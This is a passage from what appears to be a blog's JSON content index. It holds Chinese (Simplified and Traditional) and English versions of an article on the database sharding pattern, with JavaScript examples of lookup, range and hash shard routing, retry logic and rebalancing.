&#39;2019-03-31&#39;, shard: &#39;db-q1-2019.example.com&#39; &#125;, &#123; min: &#39;2019-04-01&#39;, max: &#39;2019-06-30&#39;, shard: &#39;db-q2-2019.example.com&#39; &#125;, &#123; min: &#39;2019-07-01&#39;, max: &#39;2019-09-30&#39;, shard: &#39;db-q3-2019.example.com&#39; &#125;, &#123; min: &#39;2019-10-01&#39;, max: &#39;2019-12-31&#39;, shard: &#39;db-q4-2019.example.com&#39; &#125; ]; &#125; getShardForDate(date) &#123; const range &#x3D; this.shardRanges.find(r &#x3D;&gt; date &gt;&#x3D; r.min &amp;&amp; date &lt;&#x3D; r.max ); return range ? range.shard : null; &#125; async queryOrdersByDateRange(startDate, endDate) &#123; &#x2F;&#x2F; 高效：仅查询相关分片 const relevantShards &#x3D; this.shardRanges .filter(r &#x3D;&gt; r.max &gt;&#x3D; startDate &amp;&amp; r.min &lt;&#x3D; endDate) .map(r &#x3D;&gt; r.shard); &#x2F;&#x2F; 对多个分片进行并行查询 const results &#x3D; await Promise.all( relevantShards.map(shard &#x3D;&gt; this.queryShardByDateRange(shard, startDate, endDate) ) ); return results.flat(); &#125; &#125; graph TB A[查询:2019 年第二季订单] --> B[范围路由器] B --> C[分片 Q22019 年 4-6 月] D[查询:2019 年 4-7 月订单] --> B B --> C B --> E[分片 Q32019 年 7-9 月] style A fill:#4dabf7,stroke:#1971c2 style D fill:#4dabf7,stroke:#1971c2 style B fill:#ffd43b,stroke:#fab005 style C fill:#51cf66,stroke:#2f9e44 style E fill:#51cf66,stroke:#2f9e44 💡 范围策略的优点范围查询：有效检索连续数据 自然排序：数据以逻辑顺序存储 基于时间的归档：轻松归档旧分片 ⚠️ 范围策略的风险热点：最近的数据通常被更频繁地访问 不均匀分布：某些范围可能比其他范围增长得更大 3. 哈希策略 使用哈希函数均匀分布数据： class HashShardRouter &#123; constructor() &#123; this.shards &#x3D; [ &#39;db-shard-0.example.com&#39;, &#39;db-shard-1.example.com&#39;, &#39;db-shard-2.example.com&#39;, &#39;db-shard-3.example.com&#39; ]; &#125; hashUserId(userId) &#123; &#x2F;&#x2F; 简单的哈希函数（生产环境使用更好的哈希） let hash &#x3D; 0; for (let i &#x3D; 0; i &lt; userId.length; i++) &#123; hash &#x3D; ((hash &lt;&lt; 5) - hash) + userId.charCodeAt(i); hash &#x3D; hash &amp; hash; &#x2F;&#x2F; 转换为 32 位整数 &#125; return Math.abs(hash); &#125; getShardForUser(userId) &#123; const hash &#x3D; this.hashUserId(userId); const shardIndex &#x3D; hash % this.shards.length; return this.shards[shardIndex]; &#125; async getUserData(userId) &#123; const shard &#x3D; this.getShardForUser(userId); const connection &#x3D; await this.connect(shard); return await connection.query(&#123; userId &#125;); &#125; &#125; &#x2F;&#x2F; 分布示例 const router &#x3D; new HashShardRouter(); console.log(router.getShardForUser(&#39;user-123&#39;)); &#x2F;&#x2F; db-shard-2 console.log(router.getShardForUser(&#39;user-124&#39;)); &#x2F;&#x2F; db-shard-0 console.log(router.getShardForUser(&#39;user-125&#39;)); &#x2F;&#x2F; db-shard-3 &#x2F;&#x2F; 用户分散到各个分片 graph TB A[用户 ID] --> B[哈希函数] B --> C[user-55 → 哈希: 2] B --> D[user-56 → 哈希: 0] B --> E[user-57 → 哈希: 1] C --> F[(分片 2)] D --> G[(分片 0)] E --> H[(分片 1)] style A fill:#4dabf7,stroke:#1971c2 style B fill:#ffd43b,stroke:#fab005 style F fill:#51cf66,stroke:#2f9e44 style G fill:#51cf66,stroke:#2f9e44 style H fill:#51cf66,stroke:#2f9e44 💡 哈希策略的优点均匀分布：防止热点 无需查找表：直接计算分片位置 可扩展：适用于许多分片 ⚠️ 哈希策略的挑战范围查询：难以有效查询范围 重新平衡：添加分片需要重新哈希数据 策略比较 (function() { if (typeof echarts !== 'undefined') { var chart = echarts.init(document.getElementById('chart_af1ed1130')); var option = { \"title\": { \"text\": \"分片策略权衡\" }, \"tooltip\": { \"trigger\": \"axis\" }, \"legend\": { \"data\": [\"查找\", \"范围\", \"哈希\"] }, \"radar\": { \"indicator\": [ { \"name\": \"灵活性\", \"max\": 10 }, { \"name\": \"均匀分布\", \"max\": 10 }, { \"name\": \"范围查询性能\", \"max\": 10 }, { \"name\": \"简单性\", \"max\": 10 }, { \"name\": \"重新平衡容易度\", \"max\": 10 } ] }, \"series\": [{ \"type\": \"radar\", \"data\": [ { \"value\": [9, 6, 5, 6, 9], \"name\": \"查找\" }, { \"value\": [5, 4, 10, 8, 3], \"name\": \"范围\" }, { \"value\": [6, 10, 3, 9, 4], \"name\": \"哈希\" } ] }] }; chart.setOption(option); } })(); 实际实现示例 这是一个电子商务平台的完整分片实现： class ShardedOrderDatabase &#123; constructor() &#123; &#x2F;&#x2F; 使用哈希策略实现均匀分布 this.shards &#x3D; [ &#123; id: 0, connection: &#39;orders-db-0.example.com&#39; &#125;, &#123; id: 1, connection: &#39;orders-db-1.example.com&#39; &#125;, &#123; id: 2, connection: &#39;orders-db-2.example.com&#39; &#125;, &#123; id: 3, connection: &#39;orders-db-3.example.com&#39; &#125; ]; &#125; getShardForOrder(orderId) &#123; &#x2F;&#x2F; 从订单 ID 中提取数字部分 const numericId &#x3D; parseInt(orderId.replace(&#x2F;\\D&#x2F;g, &#39;&#39;)); const shardIndex &#x3D; numericId % this.shards.length; return this.shards[shardIndex]; &#125; async createOrder(order) &#123; const shard &#x3D; this.getShardForOrder(order.id); const connection &#x3D; await this.connectToShard(shard); try &#123; await connection.query( &#39;INSERT INTO orders (id, user_id, total, items) VALUES (?, ?, ?, ?)&#39;, [order.id, order.userId, order.total, JSON.stringify(order.items)] ); return &#123; success: true, shard: shard.id &#125;; &#125; catch (error) &#123; console.error(&#96;Failed to create order on shard $&#123;shard.id&#125;:&#96;, error); throw error; &#125; &#125; async getOrder(orderId) &#123; const shard &#x3D; this.getShardForOrder(orderId); const connection &#x3D; await this.connectToShard(shard); const result &#x3D; await connection.query( &#39;SELECT * FROM orders WHERE id &#x3D; ?&#39;, [orderId] ); return result[0]; &#125; async getUserOrders(userId) &#123; &#x2F;&#x2F; 用户订单分散在各个分片 - 需要扇出查询 const results &#x3D; await Promise.all( this.shards.map(async (shard) &#x3D;&gt; &#123; const connection &#x3D; await this.connectToShard(shard); return await connection.query( &#39;SELECT * FROM orders WHERE user_id &#x3D; ? ORDER BY created_at DESC&#39;, [userId] ); &#125;) ); &#x2F;&#x2F; 合并并排序来自所有分片的结果 return results .flat() .sort((a, b) &#x3D;&gt; b.created_at - a.created_at); &#125; async connectToShard(shard) &#123; &#x2F;&#x2F; 每个分片的连接池 if (!this.connections) &#123; this.connections &#x3D; new Map(); &#125; if (!this.connections.has(shard.id)) &#123; const connection &#x3D; await createDatabaseConnection(shard.connection); this.connections.set(shard.id, connection); &#125; return this.connections.get(shard.id); &#125; &#125; 关键考量 1. 选择分片键 分片键决定数据分布和查询性能： &#x2F;&#x2F; 好：静态、均匀分布 const shardKey &#x3D; user.id; &#x2F;&#x2F; UUID，永不改变 &#x2F;&#x2F; 坏：可能随时间改变 const shardKey &#x3D; user.email; &#x2F;&#x2F; 用户可能更改电子邮件 &#x2F;&#x2F; 坏：不均匀分布 const shardKey &#x3D; user.country; &#x2F;&#x2F; 某些国家的用户多得多 📝 分片键最佳实践不可变：选择永不改变的键 高基数：许多唯一值以实现均匀分布 查询对齐：支持最常见的查询模式 避免热点：如果使用哈希策略，避免连续键 2. 跨分片查询 最小化跨越多个分片的查询： class OptimizedShardedDatabase &#123; &#x2F;&#x2F; 好：单一分片查询 async getOrderById(orderId) &#123; const shard &#x3D; this.getShardForOrder(orderId); return await this.queryShardById(shard, orderId); &#125; &#x2F;&#x2F; 可接受：带缓存的扇出 async getUserOrderCount(userId) &#123; &#x2F;&#x2F; 缓存结果以避免重复的扇出查询 const cached &#x3D; await this.cache.get(&#96;order_count:$&#123;userId&#125;&#96;); if (cached) return cached; const counts &#x3D; await Promise.all( this.shards.map(shard &#x3D;&gt; this.countUserOrders(shard, userId)) ); const total &#x3D; counts.reduce((sum, count) &#x3D;&gt; sum + count, 0); await this.cache.set(&#96;order_count:$&#123;userId&#125;&#96;, total, 300); &#x2F;&#x2F; 5 分钟 TTL return total; &#125; &#x2F;&#x2F; 更好：反规范化以避免跨分片查询 async getUserOrderCountOptimized(userId) &#123; &#x2F;&#x2F; 在用户分片中存储计数 const userShard &#x3D; this.getShardForUser(userId); return await this.queryUserOrderCount(userShard, userId); &#125; &#125; 3. 重新平衡分片 规划增长和重新平衡： class RebalancingShardManager &#123; async addNewShard(newShardConnection) &#123; &#x2F;&#x2F; 1. 将新分片添加到配置 this.shards.push(&#123; id: this.shards.length, connection: newShardConnection &#125;); &#x2F;&#x2F; 2. 逐步迁移数据 await this.migrateDataToNewShard(); &#x2F;&#x2F; 3. 更新分片映射 await this.updateShardMap(); &#125; async migrateDataToNewShard() &#123; &#x2F;&#x2F; 使用虚拟分片以便更容易重新平衡 const virtualShards &#x3D; 1000; &#x2F;&#x2F; 许多虚拟分片 const physicalShards &#x3D; this.shards.length; &#x2F;&#x2F; 将虚拟分片重新映射到物理分片 for (let i &#x3D; 0; i &lt; virtualShards; i++) &#123; const newPhysicalShard &#x3D; i % physicalShards; await this.remapVirtualShard(i, newPhysicalShard); &#125; &#125; &#125; 4. 处理故障 实现弹性策略： class ResilientShardedDatabase &#123; async queryWithRetry(shard, query, maxRetries &#x3D; 3) &#123; for (let attempt &#x3D; 1; attempt &lt;&#x3D; maxRetries; attempt++) &#123; try &#123; return await this.queryShard(shard, query); &#125; catch (error) &#123; if (attempt &#x3D;&#x3D;&#x3D; maxRetries) &#123; &#x2F;&#x2F; 如果可用，尝试副本 if (shard.replica) &#123; return await this.queryShard(shard.replica, query); &#125; throw error; &#125; &#x2F;&#x2F; 指数退避 await this.sleep(Math.pow(2, attempt) * 100); &#125; &#125; &#125; async queryShard(shard, query) &#123; const connection &#x3D; await this.connectToShard(shard); return await connection.query(query); &#125; sleep(ms) &#123; return new Promise(resolve &#x3D;&gt; setTimeout(resolve, ms)); &#125; &#125; 何时使用分片 ✅ 使用分片的时机大规模：数据量超过单一服务器容量 高吞吐量：需要处理数百万并发操作 地理分布：用户分散在多个地区 成本优化：多个商用服务器比一个高端服务器便宜 ⚠️ 避免分片的时机小规模：数据可以舒适地放在一个服务器上 复杂联结：应用程序严重依赖跨表联结 资源有限：团队缺乏管理分布式系统的专业知识 过早优化：垂直扩展仍然可行 优点总结 可扩展性：随着数据增长添加更多分片 性能：跨分片并行处理 成本效率：使用商用硬件而非昂贵的服务器 地理接近性：将数据放置在靠近用户的位置 故障隔离：一个分片的故障不会影响其他分片 挑战总结 复杂性：需要管理更多的活动部件 跨分片查询：昂贵的扇出操作 重新平衡：难以重新分配数据 引用完整性：难以跨分片维护 运营开销：监控、备份和维护成倍增加 参考资料 数据分区指南 分片模式","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[],"lang":"zh-CN"},{"title":"分片模式：水平擴展資料儲存","slug":"2019/08/Sharding-Pattern-zh-TW","date":"un66fin66","updated":"un55fin55","comments":true,"path":"/zh-TW/2019/08/Sharding-Pattern/","permalink":"https://neo01.com/zh-TW/2019/08/Sharding-Pattern/","excerpt":"將資料儲存分割成水平分區以提升可擴展性和效能。了解分片如何將資料分散到多個伺服器以處理大量資料。","text":"想像一個圖書館已經成長到單一建築物無法容納所有書籍的規模。與其建造一個不可能的巨大建築，你建立了多個圖書館分館——每個分館存放按特定類別或範圍組織的書籍。讀者根據他們要找的內容知道該去哪個分館。這就是分片的本質：將資料分散到多個儲存系統以克服單一伺服器的限制。 圖書館類比 就像一個有多個分館的圖書館系統： 將書籍分散到各個地點 允許多位讀者同時存取 減少任何單一地點的擁擠 實現地理位置上更接近使用者 分片資料儲存： 將資料分散到多個伺服器 允許平行查詢和寫入 減少任何單一資料庫的競爭 實現資料局部性以獲得更好的效能 graph TB A[應用程式] --> B[分片邏輯] B --> C[分片 1使用者 A-H] B --> D[分片 2使用者 I-P] B --> E[分片 3使用者 Q-Z] style A fill:#4dabf7,stroke:#1971c2 style B fill:#ffd43b,stroke:#fab005 style C fill:#51cf66,stroke:#2f9e44 style D fill:#51cf66,stroke:#2f9e44 style E fill:#51cf66,stroke:#2f9e44 問題：單一伺服器的限制 託管在單一伺服器上的資料儲存面臨不可避免的限制： 儲存空間限制 &#x2F;&#x2F; 隨著資料增長，單一伺服器會耗盡空間 class UserDatabase &#123; constructor() &#123; this.storage &#x3D; new DiskStorage(&#39;&#x2F;data&#39;); &#x2F;&#x2F; 當我們達到 10TB？100TB？1PB 時會發生什麼？ &#125; async addUser(user) &#123; try &#123; await this.storage.write(user.id, user); &#125; catch (error) &#123; if (error.code &#x3D;&#x3D;&#x3D; &#39;ENOSPC&#39;) &#123; &#x2F;&#x2F; 磁碟已滿 - 現在怎麼辦？ throw new Error(&#39;Storage capacity exceeded&#39;); &#125; &#125; &#125; &#125; 運算資源限制 &#x2F;&#x2F; 單一伺服器處理數百萬並發使用者 class OrderDatabase &#123; async processQuery(query) &#123; &#x2F;&#x2F; CPU 處理查詢達到上限 &#x2F;&#x2F; 記憶體快取結果耗盡 &#x2F;&#x2F; 查詢開始逾時 const result &#x3D; await this.executeQuery(query); return result; &#125; &#125; 網路頻寬瓶頸 &#x2F;&#x2F; 所有流量都通過一個網路介面 class DataStore &#123; async handleRequest(request) &#123; &#x2F;&#x2F; 網路介面在 10Gbps 時飽和 &#x2F;&#x2F; 請求開始被丟棄 &#x2F;&#x2F; 回應時間大幅增加 return await this.processRequest(request); &#125; &#125; 地理分佈挑戰 &#x2F;&#x2F; 全球使用者存取單一資料中心 class GlobalApplication &#123; async getUserData(userId) &#123; &#x2F;&#x2F; 東京的使用者存取維吉尼亞州的資料 &#x2F;&#x2F; 僅網路往返就需要 200ms 延遲 &#x2F;&#x2F; 在美國儲存歐盟資料的合規問題 return await this.database.query(&#123; userId &#125;); &#125; &#125; ⚠️ 垂直擴展的限制暫時解決方案：向單一伺服器添加更多 CPU、記憶體或磁碟 物理限制：最終你無法添加更多資源 成本效率低：高階伺服器變得指數級昂貴 單點故障：一個伺服器故障影響所有使用者 解決方案：水平分區（分片） 將資料儲存分割成稱為分片的水平分區。每個分片： 具有相同的架構 包含不同的資料子集 在獨立的儲存節點上執行 獨立運作 graph TB A[應用程式層] --> B[分片映射/路由器] B --> C[分片 A訂單 0-999] B --> D[分片 B訂單 1000-1999] B --> E[分片 C訂單 2000-2999] B --> F[分片 D訂單 3000+] C --> C1[(資料庫伺服器 1)] D --> D1[(資料庫伺服器 2)] E --> E1[(資料庫伺服器 3)] F --> F1[(資料庫伺服器 4)] style A fill:#4dabf7,stroke:#1971c2 style B fill:#ffd43b,stroke:#fab005 style C fill:#51cf66,stroke:#2f9e44 style D fill:#51cf66,stroke:#2f9e44 style E fill:#51cf66,stroke:#2f9e44 style F fill:#51cf66,stroke:#2f9e44 分片策略 1. 查找策略 使用映射表將請求路由到適當的分片： class LookupShardRouter &#123; constructor() &#123; &#x2F;&#x2F; 分片映射儲存在快速快取或資料庫中 this.shardMap &#x3D; new Map([ [&#39;tenant-1&#39;, &#39;shard-a&#39;], [&#39;tenant-2&#39;, &#39;shard-a&#39;], [&#39;tenant-3&#39;, &#39;shard-b&#39;], [&#39;tenant-4&#39;, &#39;shard-c&#39;] ]); this.shardConnections &#x3D; &#123; &#39;shard-a&#39;: &#39;db1.example.com&#39;, &#39;shard-b&#39;: &#39;db2.example.com&#39;, &#39;shard-c&#39;: &#39;db3.example.com&#39; &#125;; &#125; getShardForTenant(tenantId) &#123; const shardKey &#x3D; this.shardMap.get(tenantId); return this.shardConnections[shardKey]; &#125; async queryTenantData(tenantId, query) &#123; const shardUrl &#x3D; this.getShardForTenant(tenantId); const connection &#x3D; await this.connect(shardUrl); return await connection.query(query); &#125; &#125; graph LR A[請求:Tenant-3] --> B[查找分片映射] B --> C{Tenant-3→ 分片 B} C --> D[(分片 B資料庫)] style A fill:#4dabf7,stroke:#1971c2 style B fill:#ffd43b,stroke:#fab005 style D fill:#51cf66,stroke:#2f9e44 💡 查找策略的優點靈活性：透過更新映射輕鬆重新平衡 虛擬分片：將邏輯分片映射到較少的實體伺服器 控制：將高價值租戶分配到專用分片 2. 範圍策略 根據連續的分片鍵將相關項目分組在一起： class RangeShardRouter &#123; constructor() &#123; this.shardRanges &#x3D; [ &#123; min: &#39;2019-01-01&#39;, max: &#39;2019-03-31&#39;, shard: &#39;db-q1-2019.example.com&#39; &#125;, &#123; min: &#39;2019-04-01&#39;, max: &#39;2019-06-30&#39;, shard: &#39;db-q2-2019.example.com&#39; &#125;, &#123; min: &#39;2019-07-01&#39;, max: &#39;2019-09-30&#39;, shard: &#39;db-q3-2019.example.com&#39; &#125;, &#123; min: &#39;2019-10-01&#39;, max: &#39;2019-12-31&#39;, shard: &#39;db-q4-2019.example.com&#39; &#125; ]; &#125; getShardForDate(date) &#123; const range &#x3D; this.shardRanges.find(r &#x3D;&gt; date &gt;&#x3D; r.min &amp;&amp; date &lt;&#x3D; r.max ); return range ? range.shard : null; &#125; async queryOrdersByDateRange(startDate, endDate) &#123; &#x2F;&#x2F; 高效：僅查詢相關分片 const relevantShards &#x3D; this.shardRanges .filter(r &#x3D;&gt; r.max &gt;&#x3D; startDate &amp;&amp; r.min &lt;&#x3D; endDate) .map(r &#x3D;&gt; r.shard); &#x2F;&#x2F; 對多個分片進行平行查詢 const results &#x3D; await Promise.all( relevantShards.map(shard &#x3D;&gt; this.queryShardByDateRange(shard, startDate, endDate) ) ); return results.flat(); &#125; &#125; graph TB A[查詢:2019 年第二季訂單] --> B[範圍路由器] B --> C[分片 Q22019 年 4-6 月] D[查詢:2019 年 4-7 月訂單] --> B B --> C B --> E[分片 Q32019 年 7-9 月] style A fill:#4dabf7,stroke:#1971c2 style D fill:#4dabf7,stroke:#1971c2 style B fill:#ffd43b,stroke:#fab005 style C fill:#51cf66,stroke:#2f9e44 style E fill:#51cf66,stroke:#2f9e44 💡 範圍策略的優點範圍查詢：有效檢索連續資料 自然排序：資料以邏輯順序儲存 基於時間的歸檔：輕鬆歸檔舊分片 ⚠️ 範圍策略的風險熱點：最近的資料通常被更頻繁地存取 不均勻分佈：某些範圍可能比其他範圍增長得更大 3. 雜湊策略 使用雜湊函數均勻分佈資料： class HashShardRouter &#123; constructor() &#123; this.shards &#x3D; [ &#39;db-shard-0.example.com&#39;, &#39;db-shard-1.example.com&#39;, &#39;db-shard-2.example.com&#39;, &#39;db-shard-3.example.com&#39; ]; &#125; hashUserId(userId) &#123; &#x2F;&#x2F; 簡單的雜湊函數（生產環境使用更好的雜湊） let hash &#x3D; 0; for (let i &#x3D; 0; i &lt; userId.length; i++) &#123; hash &#x3D; ((hash &lt;&lt; 5) - hash) + userId.charCodeAt(i); hash &#x3D; hash &amp; hash; &#x2F;&#x2F; 轉換為 32 位元整數 &#125; return Math.abs(hash); &#125; getShardForUser(userId) &#123; const hash &#x3D; this.hashUserId(userId); const shardIndex &#x3D; hash % this.shards.length; return this.shards[shardIndex]; &#125; async getUserData(userId) &#123; const shard &#x3D; this.getShardForUser(userId); const connection &#x3D; await this.connect(shard); return await connection.query(&#123; userId &#125;); &#125; &#125; &#x2F;&#x2F; 分佈範例 const router &#x3D; new HashShardRouter(); console.log(router.getShardForUser(&#39;user-123&#39;)); &#x2F;&#x2F; db-shard-2 console.log(router.getShardForUser(&#39;user-124&#39;)); &#x2F;&#x2F; db-shard-0 console.log(router.getShardForUser(&#39;user-125&#39;)); &#x2F;&#x2F; db-shard-3 &#x2F;&#x2F; 使用者分散到各個分片 graph TB A[使用者 ID] --> B[雜湊函數] B --> C[user-55 → 雜湊: 2] B --> D[user-56 → 雜湊: 0] B --> E[user-57 → 雜湊: 1] C --> F[(分片 2)] D --> G[(分片 0)] E --> H[(分片 1)] style A fill:#4dabf7,stroke:#1971c2 style B fill:#ffd43b,stroke:#fab005 style F fill:#51cf66,stroke:#2f9e44 style G fill:#51cf66,stroke:#2f9e44 style H fill:#51cf66,stroke:#2f9e44 💡 雜湊策略的優點均勻分佈：防止熱點 無需查找表：直接計算分片位置 可擴展：適用於許多分片 ⚠️ 雜湊策略的挑戰範圍查詢：難以有效查詢範圍 重新平衡：添加分片需要重新雜湊資料 策略比較 (function() { if (typeof echarts !== 'undefined') { var chart = echarts.init(document.getElementById('chart_2a2c27a8e')); var option = { \"title\": { \"text\": \"分片策略權衡\" }, \"tooltip\": { \"trigger\": \"axis\" }, \"legend\": { \"data\": [\"查找\", \"範圍\", \"雜湊\"] }, \"radar\": { \"indicator\": [ { \"name\": \"靈活性\", \"max\": 10 }, { \"name\": \"均勻分佈\", \"max\": 10 }, { \"name\": \"範圍查詢效能\", \"max\": 10 }, { \"name\": \"簡單性\", \"max\": 10 }, { \"name\": \"重新平衡容易度\", \"max\": 10 } ] }, \"series\": [{ \"type\": \"radar\", \"data\": [ { \"value\": [9, 6, 5, 6, 9], \"name\": \"查找\" }, { \"value\": [5, 4, 10, 8, 3], \"name\": \"範圍\" }, { \"value\": [6, 10, 3, 9, 4], \"name\": \"雜湊\" } ] }] }; chart.setOption(option); } })(); 實際實作範例 這是一個電子商務平台的完整分片實作： class ShardedOrderDatabase &#123; constructor() &#123; &#x2F;&#x2F; 使用雜湊策略實現均勻分佈 this.shards &#x3D; [ &#123; id: 0, connection: &#39;orders-db-0.example.com&#39; &#125;, &#123; id: 1, connection: &#39;orders-db-1.example.com&#39; &#125;, &#123; id: 2, connection: &#39;orders-db-2.example.com&#39; &#125;, &#123; id: 3, connection: &#39;orders-db-3.example.com&#39; &#125; ]; &#125; getShardForOrder(orderId) &#123; &#x2F;&#x2F; 從訂單 ID 中提取數字部分 const numericId &#x3D; parseInt(orderId.replace(&#x2F;\\D&#x2F;g, &#39;&#39;)); const shardIndex &#x3D; numericId % this.shards.length; return this.shards[shardIndex]; &#125; async createOrder(order) &#123; const shard &#x3D; this.getShardForOrder(order.id); const connection &#x3D; await this.connectToShard(shard); try &#123; await connection.query( &#39;INSERT INTO orders (id, user_id, total, items) VALUES (?, ?, ?, ?)&#39;, [order.id, order.userId, order.total, JSON.stringify(order.items)] ); return &#123; success: true, shard: shard.id &#125;; &#125; catch (error) &#123; console.error(&#96;Failed to create order on shard $&#123;shard.id&#125;:&#96;, error); throw error; &#125; &#125; async getOrder(orderId) &#123; const shard &#x3D; this.getShardForOrder(orderId); const connection &#x3D; await this.connectToShard(shard); const result &#x3D; await connection.query( &#39;SELECT * FROM orders WHERE id &#x3D; ?&#39;, [orderId] ); return result[0]; &#125; async getUserOrders(userId) &#123; &#x2F;&#x2F; 使用者訂單分散在各個分片 - 需要扇出查詢 const results &#x3D; await Promise.all( this.shards.map(async (shard) &#x3D;&gt; &#123; const connection &#x3D; await this.connectToShard(shard); return await connection.query( &#39;SELECT * FROM orders WHERE user_id &#x3D; ? ORDER BY created_at DESC&#39;, [userId] ); &#125;) ); &#x2F;&#x2F; 合併並排序來自所有分片的結果 return results .flat() .sort((a, b) &#x3D;&gt; b.created_at - a.created_at); &#125; async connectToShard(shard) &#123; &#x2F;&#x2F; 每個分片的連線池 if (!this.connections) &#123; this.connections &#x3D; new Map(); &#125; if (!this.connections.has(shard.id)) &#123; const connection &#x3D; await createDatabaseConnection(shard.connection); this.connections.set(shard.id, connection); &#125; return this.connections.get(shard.id); &#125; &#125; 關鍵考量 1. 選擇分片鍵 分片鍵決定資料分佈和查詢效能： &#x2F;&#x2F; 好：靜態、均勻分佈 const shardKey &#x3D; user.id; &#x2F;&#x2F; UUID，永不改變 &#x2F;&#x2F; 壞：可能隨時間改變 const shardKey &#x3D; user.email; &#x2F;&#x2F; 使用者可能更改電子郵件 &#x2F;&#x2F; 壞：不均勻分佈 const shardKey &#x3D; user.country; &#x2F;&#x2F; 某些國家的使用者多得多 📝 分片鍵最佳實踐不可變：選擇永不改變的鍵 高基數：許多唯一值以實現均勻分佈 查詢對齊：支援最常見的查詢模式 避免熱點：如果使用雜湊策略，避免連續鍵 2. 跨分片查詢 最小化跨越多個分片的查詢： class OptimizedShardedDatabase &#123; &#x2F;&#x2F; 好：單一分片查詢 async getOrderById(orderId) &#123; const shard &#x3D; this.getShardForOrder(orderId); return await this.queryShardById(shard, orderId); &#125; &#x2F;&#x2F; 可接受：帶快取的扇出 async getUserOrderCount(userId) &#123; &#x2F;&#x2F; 快取結果以避免重複的扇出查詢 const cached &#x3D; await this.cache.get(&#96;order_count:$&#123;userId&#125;&#96;); if (cached) return cached; const counts &#x3D; await Promise.all( this.shards.map(shard &#x3D;&gt; this.countUserOrders(shard, userId)) ); const total &#x3D; counts.reduce((sum, count) &#x3D;&gt; sum + count, 0); await this.cache.set(&#96;order_count:$&#123;userId&#125;&#96;, total, 300); &#x2F;&#x2F; 5 分鐘 TTL return total; &#125; &#x2F;&#x2F; 更好：反正規化以避免跨分片查詢 async getUserOrderCountOptimized(userId) &#123; &#x2F;&#x2F; 在使用者分片中儲存計數 const userShard &#x3D; this.getShardForUser(userId); return await this.queryUserOrderCount(userShard, userId); &#125; &#125; 3. 重新平衡分片 規劃增長和重新平衡： class RebalancingShardManager &#123; async addNewShard(newShardConnection) &#123; &#x2F;&#x2F; 1. 將新分片添加到配置 this.shards.push(&#123; id: this.shards.length, connection: newShardConnection &#125;); &#x2F;&#x2F; 2. 逐步遷移資料 await this.migrateDataToNewShard(); &#x2F;&#x2F; 3. 更新分片映射 await this.updateShardMap(); &#125; async migrateDataToNewShard() &#123; &#x2F;&#x2F; 使用虛擬分片以便更容易重新平衡 const virtualShards &#x3D; 1000; &#x2F;&#x2F; 許多虛擬分片 const physicalShards &#x3D; this.shards.length; &#x2F;&#x2F; 將虛擬分片重新映射到實體分片 for (let i &#x3D; 0; i &lt; virtualShards; i++) &#123; const newPhysicalShard &#x3D; i % physicalShards; await this.remapVirtualShard(i, newPhysicalShard); &#125; &#125; &#125; 4. 處理故障 實作彈性策略： class ResilientShardedDatabase &#123; async queryWithRetry(shard, query, maxRetries &#x3D; 3) &#123; for (let attempt &#x3D; 1; attempt &lt;&#x3D; maxRetries; attempt++) &#123; try &#123; return await this.queryShard(shard, query); &#125; catch (error) &#123; if (attempt &#x3D;&#x3D;&#x3D; maxRetries) &#123; &#x2F;&#x2F; 如果可用，嘗試副本 if (shard.replica) &#123; return await this.queryShard(shard.replica, query); &#125; throw error; &#125; &#x2F;&#x2F; 指數退避 await this.sleep(Math.pow(2, attempt) * 100); &#125; &#125; &#125; async queryShard(shard, query) &#123; const connection &#x3D; await this.connectToShard(shard); return await connection.query(query); &#125; sleep(ms) &#123; return new Promise(resolve &#x3D;&gt; setTimeout(resolve, ms)); &#125; &#125; 何時使用分片 ✅ 使用分片的時機大規模：資料量超過單一伺服器容量 高吞吐量：需要處理數百萬並發操作 地理分佈：使用者分散在多個地區 成本優化：多個商用伺服器比一個高階伺服器便宜 ⚠️ 避免分片的時機小規模：資料可以舒適地放在一個伺服器上 複雜聯結：應用程式嚴重依賴跨表聯結 資源有限：團隊缺乏管理分散式系統的專業知識 過早優化：垂直擴展仍然可行 優點總結 可擴展性：隨著資料增長添加更多分片 效能：跨分片平行處理 成本效率：使用商用硬體而非昂貴的伺服器 地理接近性：將資料放置在靠近使用者的位置 故障隔離：一個分片的故障不會影響其他分片 挑戰總結 複雜性：需要管理更多的活動部件 跨分片查詢：昂貴的扇出操作 重新平衡：難以重新分配資料 參照完整性：難以跨分片維護 營運開銷：監控、備份和維護成倍增加 參考資料 資料分區指南 分片模式","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[],"lang":"zh-TW"},{"title":"The Sharding Pattern: Scaling Data Stores Horizontally","slug":"2019/08/Sharding-Pattern","date":"un66fin66","updated":"un55fin55","comments":true,"path":"2019/08/Sharding-Pattern/","permalink":"https://neo01.com/2019/08/Sharding-Pattern/","excerpt":"Divide your data store into horizontal partitions to improve scalability and performance. Learn how sharding distributes data across multiple servers to handle massive volumes.","text":"Imagine a library that has grown so large that a single building can no longer hold all the books. Instead of building one impossibly large structure, you create multiple library branches—each holding books organized by a specific category or range. Patrons know which branch to visit based on what they’re looking for. This is the essence of sharding: dividing data across multiple stores to overcome the limitations of a single server. The Library Analogy Just as a library system with multiple branches: Distributes books across locations Allows parallel access by many patrons Reduces crowding at any single location Enables geographic proximity to users A sharded data store: Distributes data across multiple servers Allows parallel queries and writes Reduces contention on any single database Enables data locality for better performance graph TB A[Application] --> B[Sharding Logic] B --> C[Shard 1Users A-H] B --> D[Shard 2Users I-P] B --> E[Shard 3Users Q-Z] style A fill:#4dabf7,stroke:#1971c2 style B fill:#ffd43b,stroke:#fab005 style C fill:#51cf66,stroke:#2f9e44 style D fill:#51cf66,stroke:#2f9e44 style E fill:#51cf66,stroke:#2f9e44 The Problem: Single Server Limitations A data store hosted on a single server faces inevitable constraints: Storage Space Limitations &#x2F;&#x2F; As data grows, a single server runs out of space class UserDatabase &#123; constructor() &#123; this.storage &#x3D; new DiskStorage(&#39;&#x2F;data&#39;); &#x2F;&#x2F; What happens when we reach 10TB? 100TB? 1PB? &#125; async addUser(user) &#123; try &#123; await this.storage.write(user.id, user); &#125; catch (error) &#123; if (error.code &#x3D;&#x3D;&#x3D; &#39;ENOSPC&#39;) &#123; &#x2F;&#x2F; Disk full - now what? throw new Error(&#39;Storage capacity exceeded&#39;); &#125; &#125; &#125; &#125; Computing Resource Constraints &#x2F;&#x2F; Single server handling millions of concurrent users class OrderDatabase &#123; async processQuery(query) &#123; &#x2F;&#x2F; CPU maxed out processing queries &#x2F;&#x2F; Memory exhausted caching results &#x2F;&#x2F; Queries start timing out const result &#x3D; await 